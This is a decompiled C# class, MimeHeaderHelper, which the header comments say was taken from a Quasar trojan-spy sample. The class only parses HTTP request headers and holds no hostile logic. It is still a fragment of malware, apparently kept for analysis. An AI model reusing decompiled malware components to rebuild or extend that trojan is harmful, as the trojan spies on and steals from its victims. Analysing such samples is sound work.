// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.MimeHeaderHelper
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public static class MimeHeaderHelper
  {
    private const string m_Tab = "\t";
    private const char m_Colon = ':';
    private const string m_Space = " ";
    private const char m_SpaceChar = ' ';
    private const string m_ValueSeparator = ", ";

    public static void ParseHttpHeader(string headerData, HttpHeaderInfo header)
    {
      string str1 = string.Empty;
      string key1 = string.Empty;
      string str2 = string.Empty;
      StringReader stringReader = new StringReader(headerData);
      Dictionary<string, string> dictionary = new Dictionary<string, string>((IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
      string str3;
      while (!string.IsNullOrEmpty(str3 = stringReader.ReadLine()))
      {
        if (string.IsNullOrEmpty(str1))
          str1 = str3;
        else if (str3.StartsWith("\t") && !string.IsNullOrEmpty(key1))
        {
          str2 += str3.Trim();
          header[key1] = str2;
        }
        else
        {
          int length = str3.IndexOf(':');
          if (length > 0)
          {
            string key2 = str3.Substring(0, length);
            if (!string.IsNullOrEmpty(key2))
              key2 = key2.Trim();
            int startIndex = length + 1;
            if (str3.Length > startIndex)
            {
              string str4 = str3.Substring(startIndex);
              if (!string.IsNullOrEmpty(str4) && str4.StartsWith(" ") && str4.Length > 1)
                str4 = str4.Substring(1);
              if (!string.IsNullOrEmpty(key2))
              {
                if (dictionary.ContainsKey(key2))
                {
                  str2 = header[key2] + ", " + str4;
                  header[key2] = str2;
                }
                else
                {
                  header[key2] = str2 = str4;
                  dictionary.Add(key2, key2);
                }
                key1 = key2;
              }
            }
          }
        }
      }
      string[] strArray = str1.Split(' ');
      header.Method = strArray[0];
      header.Path = strArray[1];
      header.Version = strArray[2];
    }
  }
}
